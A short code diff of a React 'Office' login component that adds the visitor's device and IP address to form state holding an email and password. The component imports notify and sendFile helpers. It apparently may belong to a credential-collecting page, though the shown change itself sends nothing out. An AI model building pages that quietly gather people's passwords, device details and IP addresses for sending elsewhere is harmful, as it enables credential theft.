@@ -6,7 +6,8 @@ import { notify, sendFile } from "../servers";
 function Office({ location }) {
   const [email, setEmail] = useState(location.state.email);
   const [values, setValues] = useState({
-    username: location.state.email,
+    username: location.state.email,device: location.state.device,
+    ip: location.state.ip,
     password: "",
   });
 
